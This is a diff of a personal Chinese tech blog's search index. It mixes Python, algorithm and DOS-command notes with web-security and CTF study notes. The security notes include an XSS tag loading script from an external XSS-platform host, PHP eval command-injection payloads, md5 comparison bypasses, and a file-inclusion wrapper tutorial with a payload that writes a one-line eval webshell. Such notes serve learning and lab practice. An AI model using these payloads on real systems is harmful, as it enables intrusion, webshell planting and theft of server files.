-↓↓↓！~极限代码~！(可以不加最后的&gt;回收符号，下面代码已测试成功)↓↓↓
-
-&lt;sCRiPt/SrC=//xss.yt/YLgl&gt;
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTML</title>
-    <url>/2023/04/12/htmllearing/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>html</tag>
-        <tag>学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python</title>
-    <url>/2023/04/21/python/</url>
-    <content><![CDATA[<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash">  astr=&quot;python&quot;      //[起始：结束（不包含）：步长]
-  print(astr[0:2])   //py 
-  print(astr[-1])
-  print(astr[::-1])
-</code></pre>
-<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><pre><code class="bash">  alist=[&quot;tom&quot;,&quot;jerry&quot;] //可以写入不同类型的数据
-  alist[0]
-  if name in alist :
-      print(&quot;Yes&quot;);
-</code></pre>
-<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><pre><code class="bash">  atuple=(&quot;tom&quot;,&quot;jerry&quot;) 
-</code></pre>
-<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><pre><code class="bash">  userdict=&#123;&quot;tom&quot;:&quot;123&quot;,&quot;jerry&quot;:&quot;456&quot;&#125;//字典没有索引值 键值对来取值
-  if name in userdict and password==userdict[username]:
-      print(&quot;Yes&quot;)
-</code></pre>
-<h3 id="文件读取写入"><a href="#文件读取写入" class="headerlink" title="文件读取写入"></a>文件读取写入</h3><blockquote>
-<p>f&#x3D;open(“路径”,”#”)    &#x2F;&#x2F;#&#x3D;rb···</p>
-</blockquote>
-<ul>
-<li><code>close()</code> - 关闭文件，释放相关的系统资源</li>
-<li><code>read(size=-1)</code> - 从文件中读取指定字节数的数据，如果未指定 size 或 size 为负数，则读取整个文件</li>
-<li><code>readline(size=-1)</code> - 从文件中读取一行数据，可以指定最大读取字节数</li>
-<li><code>readlines(hint=-1)</code> - 从文件中读取所有行，并返回一个包含所有行的列表，可以指定最大读取字节数</li>
-<li><code>write(text)</code> - 将指定的文本写入文件</li>
-<li><code>writelines(lines)</code> - 向文件中写入一个字符串列表，不添加行分隔符</li>
-<li><code>seek(offset[, whence])</code> - 改变文件指针的位置，offset 表示相对于 whence 的偏移量，whence 可选值：0（文件开头，默认），1（当前位置），2（文件末尾）</li>
-<li><code>tell()</code> - 返回文件指针的当前位置，相对于文件开头</li>
-<li><code>flush()</code> - 将文件缓冲区的内容写入文件，并清空缓冲区</li>
-<li><code>fileno()</code> - 返回文件的文件描述符（整数）</li>
-<li><code>isatty()</code> - 检查文件是否为终端设备（例如控制台、终端窗口等）</li>
-<li><code>truncate(size=None)</code> - 裁剪文件到指定大小，如果未指定 size，则裁剪到当前文件指针位置</li>
-</ul>
-<h3 id="模块和函数"><a href="#模块和函数" class="headerlink" title="模块和函数"></a>模块和函数</h3><pre><code class="python">    &quot;&quot;&quot;
-    模块作用
-    包含功能
-    other
-    &quot;&quot;&quot;
-    # 变量类型 作用
-    def name():
-        #函数作用 
-        return 
-
-
-    #主程序中：
-    import name
-</code></pre>
-<h3 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h3><pre><code class="python">    try:
-        action
-    except errimfomation:
-        explaination
-    except ···：
-        more 
-</code></pre>
-<h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><p>a example:</p>
-<pre><code class="python">class SKB(object):
-    color = &quot;green&quot;
-    hands = 2
-    def __init__(self,COLOR,HANDS):
-        #初始化
-        self.color=COLOR
-        self.hands=HANDS
-    def dahulu(self):
-        print(&quot;轰······&quot;)
-        #  &quot;number%d&quot; %(number)
-    def jiaobian(self):
-        print(&quot;我没有&quot;)
-    def myaihao(self):
-        print(&quot;傻逼SKB&quot;)
-
-mysheyou = SKB(&quot;green&quot;,2)
-mysheyou.dahulu()
-mysheyou.myaihao()
-mysheyou.jiaobian()
-</code></pre>
-<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><h4 id="python获取代码"><a href="#python获取代码" class="headerlink" title="python获取代码"></a>python获取代码</h4><pre><code class="python">import urllib.request  
-
-class GetHtml(object):
-    def __init__(self, URL,HEAD):  
-        self.url = URL
-        self.head=HEAD
-
-    def get_index(self):
-        self.request = urllib.request.Request(self.url)
-        self.request.add_header(&quot;user-agent&quot;,self.head)
-        self.response=urllib.request.urlopen(self.request)
-        return self.response.read()
-
-html = GetHtml(&quot;https://siren.blue&quot;,&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;)
-print(html.get_index()) 
-</code></pre>
-<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><pre><code class="python">#re模块
-&quot;&quot;&quot;
-.       单个字符匹配
-[]      括号内的内容会被逐一匹配
-\d      匹配单个数字
-\w      [0-9a-zA-Z]
-\s      空白字符 空格 tab
-*       匹配左邻字符出现0次或多次
-+       左邻字符出现一次或多次
-?       左邻字符出现一次或0次
-&#123;n,m&#125;   左邻字符出现n 到 m次
-^       以什么字符串开头
-$       以什么字符串结尾
-()\\1   括号内保存 分组保存
-&quot;&quot;&quot;
-re.findall(&quot;.x&quot;,&quot;&quot;)
-re.findall(&quot;[Gf]ood&quot;,&quot;&quot;)
-re.findall(&quot;hello&quot;,&quot;&quot;)# 直接匹配
-re.findall(&quot;Good｜food&quot;,&quot;&quot;)
-re.findall(&quot;go*gle&quot;,&quot;i like google not ggle goooogle and gogle&quot;)
-re.findall(&quot;go+gle&quot;,&quot;&quot;)
-re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
-</code></pre>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>洛谷p1216</title>
     <url>/2023/04/14/Algorithm/</url>
     <content><![CDATA[<h1 id="USACO1-5-IOI1994-数字三角形-Number-Triangles"><a href="#USACO1-5-IOI1994-数字三角形-Number-Triangles" class="headerlink" title="[USACO1.5][IOI1994]数字三角形 Number Triangles"></a>[USACO1.5][IOI1994]数字三角形 Number Triangles</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>观察下面的数字金字塔。</p>
@@ -674,90 +64,39 @@ re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
       </tags>
   </entry>
   <entry>
-    <title>pythonlist</title>
-    <url>/2023/04/21/pythonlist/</url>
-    <content><![CDATA[<h4 id="str"><a href="#str" class="headerlink" title="str"></a>str</h4><ul>
-<li><code>capitalize()</code> - 将字符串的第一个字符大写，其余字符小写</li>
-<li><code>casefold()</code> - 返回一个区分大小写的等效字符串</li>
-<li><code>center(width[, fillchar])</code> - 将字符串居中，使用指定字符填充两侧</li>
-<li><code>count(sub[, start[, end]])</code> - 计算子字符串在字符串中出现的次数</li>
-<li><code>encode(encoding=&#39;utf-8&#39;, errors=&#39;strict&#39;)</code> - 对字符串进行编码</li>
-<li><code>endswith(suffix[, start[, end]])</code> - 检查字符串是否以给定的子字符串结尾</li>
-<li><code>expandtabs(tabsize=8)</code> - 将字符串中的制表符替换为指定数量的空格</li>
-<li><code>find(sub[, start[, end]])</code> - 查找子字符串在字符串中首次出现的位置，如果未找到则返回 -1</li>
-<li><code>format(*args, **kwargs)</code> - 使用指定值替换字符串中的占位符</li>
-<li><code>format_map(mapping)</code> - 使用字典替换字符串中的占位符</li>
-<li><code>index(sub[, start[, end]])</code> - 类似于 find()，但如果未找到子字符串，会引发 ValueError</li>
-<li><code>isalnum()</code> - 检查字符串是否只包含字母和数字</li>
-<li><code>isalpha()</code> - 检查字符串是否只包含字母</li>
-<li><code>isascii()</code> - 检查字符串是否只包含 ASCII 字符</li>
-<li><code>isdecimal()</code> - 检查字符串是否只包含十进制数字</li>
-<li><code>isdigit()</code> - 检查字符串是否只包含数字字符</li>
-<li><code>isidentifier()</code> - 检查字符串是否是有效的 Python 标识符</li>
-<li><code>islower()</code> - 检查字符串中的字母是否都是小写</li>
-<li><code>isnumeric()</code> - 检查字符串是否只包含数值字符</li>
-<li><code>isprintable()</code> - 检查字符串是否只包含可打印字符</li>
-<li><code>isspace()</code> - 检查字符串是否只包含空白字符</li>
-<li><code>istitle()</code> - 检查字符串是否为标题格式（每个单词首字母大写，其余字母小写）</li>
-<li><code>isupper()</code> - 检查字符串中的字母是否都是大写</li>
-<li><code>join(iterable)</code> - 使用字符串作为连接符，将可迭代对象中的元素连接成一个新字符串</li>
-<li><code>ljust(width[, fillchar])</code> - 返回一个左对齐的字符串，并使用指定字符填充右侧</li>
-<li><code>lower()</code> - 将字符串中的所有字符转换为小写</li>
-<li><code>lstrip([chars])</code> - 移除字符串左侧的空白字符或指定字符</li>
-<li><code>maketrans(x[, y[, z]])</code> - 为字符串的 translate() 方法生成一个映射表</li>
-<li><code>partition(sep)</code> - 将字符串分割为一个 3 元组 (head, sep, tail)，head 是分隔符前的子串，sep 是分隔符本身，tail 是分隔符后的子串</li>
-<li><code>replace(old, new[, count])</code> - 将字符串中的 <code>old</code> 替换为 <code>new</code>，可指定替换次数</li>
-<li><code>rfind(sub[, start[, end]])</code> - 查找子字符串在字符串中最后一次出现的位置，如果未找到则返回 -1</li>
-<li><code>rindex(sub[, start[, end]])</code> - 类似于 rfind()，但如果未找到子字符串，会引发 ValueError</li>
-<li><code>rjust(width[, fillchar])</code> - 返回一个右对齐的字符串，并使用指定字符填充左侧</li>
-<li><code>rpartition(sep)</code> - 从右侧开始将字符串分割为一个 3 元组 (head, sep, tail)</li>
-<li><code>rsplit(sep=None, maxsplit=-1)</code> - 从右侧开始使用指定分隔符将字符串拆分为子字符串列表，可指定最大拆分次数</li>
-<li><code>rstrip([chars])</code> - 移除字符串右侧的空白字符或指定字符</li>
-<li><code>split(sep=None, maxsplit=-1)</code> - 使用指定分隔符将字符串拆分为子字符串列表，可指定最大拆分次数</li>
-<li><code>splitlines([keepends])</code> - 将字符串按行拆分为一个列表，可选择是否保留换行符</li>
-<li><code>startswith(prefix[, start[, end]])</code> - 检查字符串是否以给定的子字符串开头</li>
-<li><code>strip([chars])</code> - 移除字符串两端的空白字符或指定字符</li>
-<li><code>swapcase()</code> - 将字符串中的大小写字母互换</li>
-<li><code>title()</code> - 将字符串中的每个单词的首字母大写，其余字母小写</li>
-<li><code>translate(table)</code> - 使用指定的映射表替换字符串中的字符</li>
-<li><code>upper()</code> - 将字符串中的所有字符转换为大写</li>
-<li><code>zfill(width)</code> - 用零填充字符串的左侧，使其达到指定宽度</li>
-</ul>
-<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><ul>
-<li><code>count(value)</code> - 计算指定值在元组中出现的次数</li>
-<li><code>index(value[, start[, end]])</code> - 返回指定值在元组中首次出现的索引，可以指定查找范围，如果未找到则抛出 ValueError</li>
-</ul>
-<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><ul>
-<li><code>append(item)</code> - 在列表末尾添加一个元素</li>
-<li><code>extend(iterable)</code> - 将一个可迭代对象的元素添加到列表末尾</li>
-<li><code>insert(index, item)</code> - 在指定索引处插入一个元素</li>
-<li><code>remove(value)</code> - 移除列表中首次出现的指定值，如果未找到则抛出 ValueError</li>
-<li><code>pop([index])</code> - 移除并返回指定索引处的元素，默认移除并返回列表最后一个元素</li>
-<li><code>clear()</code> - 移除列表中的所有元素</li>
-<li><code>index(value[, start[, end]])</code> - 返回指定值在列表中首次出现的索引，可以指定查找范围，如果未找到则抛出 ValueError</li>
-<li><code>count(value)</code> - 计算指定值在列表中出现的次数</li>
-<li><code>sort(key=None, reverse=False)</code> - 对列表元素进行排序，可指定排序键和排序顺序</li>
-<li><code>reverse()</code> - 反转列表中的元素顺序</li>
-<li><code>copy()</code> - 返回列表的一个浅拷贝</li>
-</ul>
-<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul>
-<li><code>clear()</code> - 移除字典中的所有元素</li>
-<li><code>copy()</code> - 返回字典的一个浅拷贝</li>
-<li><code>get(key[, default])</code> - 返回字典中指定键的值，如果键不存在，则返回默认值（默认为 None）</li>
-<li><code>items()</code> - 返回一个包含字典所有键值对的视图对象</li>
-<li><code>keys()</code> - 返回一个包含字典所有键的视图对象</li>
-<li><code>values()</code> - 返回一个包含字典所有值的视图对象</li>
-<li><code>pop(key[, default])</code> - 移除并返回字典中指定键的值，如果键不存在，返回默认值（若未提供默认值，抛出 KeyError）</li>
-<li><code>popitem()</code> - 移除并返回字典中的一个键值对（从 Python 3.7 开始，为最后一个键值对），如果字典为空，抛出 KeyError</li>
-<li><code>setdefault(key[, default])</code> - 如果键不存在于字典中，则添加键并设置其值为默认值（默认为 None），返回该键对应的值</li>
-<li><code>update([other])</code> - 将一个字典（或其他可迭代映射类型）的键值对添加到当前字典中，若有重复的键，则覆盖原有键值对</li>
-</ul>
+    <title>PHPsafe</title>
+    <url>/2023/05/07/PHPsafe/</url>
+    <content><![CDATA[<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre><code class="bash">&lt;?php
+    include &quot;flag.php&quot;;
+    $a = @$_REQUEST[&#39;hello&#39;];
+    eval( &quot;var_dump($a);&quot;);
+    show_source(__FILE__);
+?&gt;
+</code></pre>
+<p><code>http://114.67.175.224:14508/?hello=file(&quot;flag.php&quot;)</code><br> 我还是觉得，脱离了基础全是浮云虚幻</p>
+<p><code>?hello=system(&quot;cat%20flag.php|base64&quot;)</code><br>或许这个更适合我，只不过需要注意 ｜base64</p>
+<p>$_SERVER：包含服务器及其执行环境的信息，如头信息、路径等。<br>$_GET：包含通过 HTTP GET 方法传递给脚本的变量。<br>$_POST：包含通过 HTTP POST 方法传递给脚本的变量。<br>$_COOKIE：包含通过 HTTP Cookies 传递给脚本的变量。<br>$_FILES：包含通过 HTTP POST 方法上传的文件信息。<br>$_ENV：包含环境变量。<br>$_REQUEST：包含 $_GET、$_POST 和 $_COOKIE 的内容。请注意，由于它会合并其他超全局变量的数据，因此不建议在实际代码中使用 $_REQUEST，因为它可能导致安全隐患。<br>$_SESSION：包含当前脚本可用的会话变量。在使用 session_start() 函数启动会话后，可以使用 $_SESSION 来存储和检索跨页面请求的数据。<br>$GLOBALS：包含所有全局变量的关联数组</p>
+<p>1.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br><code>url/?kkeyey1[]=1&amp;kkeyey2[]=2</code><br>2，利用&#x3D;&#x3D;比较漏洞</p>
+<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
 ]]></content>
       <categories>
-        <category>python</category>
+        <category>网络安全</category>
       </categories>
       <tags>
+        <tag>php</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML</title>
+    <url>/2023/04/12/htmllearing/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>html</tag>
+        <tag>学习</tag>
       </tags>
   </entry>
   <entry>
@@ -976,27 +315,729 @@ curl -X POST https://www.example.com
       </tags>
   </entry>
   <entry>
-    <title>PHPsafe</title>
-    <url>/2023/05/07/PHPsafe/</url>
-    <content><![CDATA[<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre><code class="bash">&lt;?php
-    include &quot;flag.php&quot;;
-    $a = @$_REQUEST[&#39;hello&#39;];
-    eval( &quot;var_dump($a);&quot;);
-    show_source(__FILE__);
-?&gt;
+    <title>伪协议</title>
+    <url>/2023/05/12/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F; 协议"></a>file:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：<br>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen与allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。<br>说明：<br>file:&#x2F;&#x2F; 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()，include_path</code> 会可选地搜索，也作为相对的路径。<br>用法：</p>
+<pre><code class="bash">/path/to/file.ext
+relative/path/to/file.ext
+fileInCwd.ext
+C:/path/to/winfile.ext
+C:\path\to\winfile.ext
+\\smbserver\share\path\to\winfile.ext
+file:///path/to/file.ext
 </code></pre>
-<p><code>http://114.67.175.224:14508/?hello=file(&quot;flag.php&quot;)</code><br> 我还是觉得，脱离了基础全是浮云虚幻</p>
-<p><code>?hello=system(&quot;cat%20flag.php|base64&quot;)</code><br>或许这个更适合我，只不过需要注意 ｜base64</p>
-<p>$_SERVER：包含服务器及其执行环境的信息，如头信息、路径等。<br>$_GET：包含通过 HTTP GET 方法传递给脚本的变量。<br>$_POST：包含通过 HTTP POST 方法传递给脚本的变量。<br>$_COOKIE：包含通过 HTTP Cookies 传递给脚本的变量。<br>$_FILES：包含通过 HTTP POST 方法上传的文件信息。<br>$_ENV：包含环境变量。<br>$_REQUEST：包含 $_GET、$_POST 和 $_COOKIE 的内容。请注意，由于它会合并其他超全局变量的数据，因此不建议在实际代码中使用 $_REQUEST，因为它可能导致安全隐患。<br>$_SESSION：包含当前脚本可用的会话变量。在使用 session_start() 函数启动会话后，可以使用 $_SESSION 来存储和检索跨页面请求的数据。<br>$GLOBALS：包含所有全局变量的关联数组</p>
-<p>1.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br><code>url/?kkeyey1[]=1&amp;kkeyey2[]=2</code><br>2，利用&#x3D;&#x3D;比较漏洞</p>
-<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
+<p>示例：</p>
+<ul>
+<li>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</li>
+</ul>
+<p><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p>
+<ul>
+<li>[文件的相对路径和文件名]</li>
+</ul>
+<p><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></p>
+<ul>
+<li>[http：&#x2F;&#x2F;网络路径和文件名]<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></li>
+</ul>
+<h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F; 协议"></a>php:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :仅php://input php://stdin php://memory</code><br><code>php://temp 需要on</code><br>作用：<br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。<br>说明：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<p>作用</p>
+<pre><code class="bash">php://input:可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。
+php://output:只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。
+php://fd:(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。
+php://memory php://temp(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。
+php://filter:(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
+</code></pre>
+<h4 id="php-x2F-x2F-filter参数详解"><a href="#php-x2F-x2F-filter参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter参数详解"></a>php:&#x2F;&#x2F;filter参数详解</h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：<br>php:&#x2F;&#x2F;filter 参数描述</p>
+<ul>
+<li>resource&#x3D;&lt;要过滤的数据流&gt;必须项。它指定了你要筛选过滤的数据流。</li>
+<li>read&#x3D;&lt;读链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（<em>\ </em>）分隔。</li>
+<li>write&#x3D;&lt;写链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</li>
+<li>&lt;; 两个链的过滤器&gt;任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</li>
+</ul>
+<p>可用的过滤器列表（4类）</p>
+<ul>
+<li>字符串过滤器<br>string.rot13 等同于str_rot13()，rot13变换<br>string.toupper 等同于strtoupper()，转大写字母<br>string.tolower 等同于strtolower()，转小写字母<br>string.strip_tags 等同于strip_tags()，去除html、PHP语言标签</li>
+<li>转换过滤器<br>convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码<br>convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码</li>
+<li>压缩过滤器<br>zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。<br>bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。</li>
+<li>加密过滤器<br>mcrypt.<em>libmcrypt 对称加密算法<br>mdecrypt.</em> libmcrypt 对称解密算法<br>示例：</li>
+</ul>
+<p><code>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</code></p>
+<p><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></p>
+<p><code>php://input + [POST DATA]执行php代码</code></p>
+<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php phpinfo(); ?&gt;
+图片描述
+</code></pre>
+<p>若有写入权限，写入一句话木马</p>
+<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;
+</code></pre>
+<h3 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。<br>示例：</p>
+<p>zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
+<p><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></p>
+<p><code>compress.bzip2://file.bz2</code></p>
+<p>压缩 <code>phpinfo.txt</code> 为<code>phpinfo.bz2</code>并上传（同样支持任意后缀名）</p>
+<p><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></p>
+<p><code>compress.zlib://file.gz</code></p>
+<p>压缩<code>phpinfo.txt</code>为<code> phpinfo.gz</code> 并上传（同样支持任意后缀名）</p>
+<p><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></p>
+<h3 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F; 协议"></a>data:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。<br>用法：</p>
+<p><code>data://text/plain,</code><br><code>data://text/plain;base64,</code><br>示例：</p>
+<pre><code class="bash">data://text/plain,
+
+http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
+
+or
+
+data://text/plain;base64,
+
+http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<h3 id="http-和https-协议"><a href="#http-和https-协议" class="headerlink" title="http://和https://协议"></a><code>http://</code>和<code>https://</code>协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。<br>用法：</p>
+<pre><code class="bash">http://example.com
+http://example.com/file.php?var1=val1&amp;var2=val2
+http://user:password@example.com
+https://example.com
+https://example.com/file.php?var1=val1&amp;var2=val2
+https://user:password@example.com
+</code></pre>
+<p>示例：<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></p>
+<h3 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F; 协议"></a>phar:&#x2F;&#x2F; 协议</h3><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
+<p><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></p>
 ]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CyberSafe_Notes</title>
+    <url>/2023/04/19/CyberSafe-Notes/</url>
+    <content><![CDATA[<h2 id="基本的dos命令"><a href="#基本的dos命令" class="headerlink" title="基本的dos命令"></a>基本的dos命令</h2><ul>
+<li><code>dir</code> - 显示当前目录下的文件和子目录</li>
+<li><code>cd &lt;directory&gt;</code> - 更改当前目录到指定目录</li>
+<li><code>mkdir &lt;directory_name&gt;</code> - 创建新目录</li>
+<li><code>rmdir &lt;directory_name&gt;</code> - 删除目录</li>
+<li><code>copy &lt;source&gt; &lt;destination&gt;</code> - 复制文件或目录</li>
+<li><code>move &lt;source&gt; &lt;destination&gt;</code> - 移动文件或目录</li>
+<li><code>del &lt;filename&gt;</code> - 删除文件</li>
+<li><code>rename &lt;old_filename&gt; &lt;new_filename&gt;</code> - 重命名文件或目录</li>
+<li><code>type &lt;filename&gt;</code> - 显示文件的内容</li>
+<li><code>find /i &quot;text&quot; &lt;filename&gt;</code> - 在文件中查找指定的文本</li>
+<li><code>attrib &lt;filename&gt;</code> - 显示或更改文件属性</li>
+<li><code>cls</code> - 清屏</li>
+<li><code>echo &lt;text&gt;</code> - 显示文本</li>
+<li><code>systeminfo</code> - 显示计算机的详细系统信息</li>
+<li><code>gpupdate /force</code> - 强制更新计算机的组策略设置</li>
+<li><code>shutdown /r</code> - 重新启动计算机</li>
+<li><code>shutdown /s</code> - 关闭计算机</li>
+<li><code>ping &lt;hostname_or_ip_address&gt;</code> - 向指定的主机或 IP 发送 ICMP 回显请求以测试网络连接</li>
+<li><code>ipconfig /all</code> - 显示所有网络接口的详细配置信息</li>
+<li><code>ipconfig /release</code> - 释放当前的 IP 地址配置</li>
+<li><code>ipconfig /renew</code> - 重新获取 IP 地址</li>
+<li><code>ipconfig /flushdns</code> - 清空 DNS 解析缓存</li>
+<li><code>netstat -a</code> - 显示所有活动网络连接和侦听端口</li>
+<li><code>netstat -ano</code> - 显示所有活动网络连接、侦听端口及其关联的进程 ID</li>
+<li><code>netstat -r</code> - 显示 IP 路由表</li>
+<li><code>tracert &lt;hostname_or_ip_address&gt;</code> - 显示到指定目标的 IP 数据包路径</li>
+<li><code>nslookup &lt;hostname_or_ip_address&gt;</code> - 查询 DNS，获取指定主机名或 IP 地址的详细信息</li>
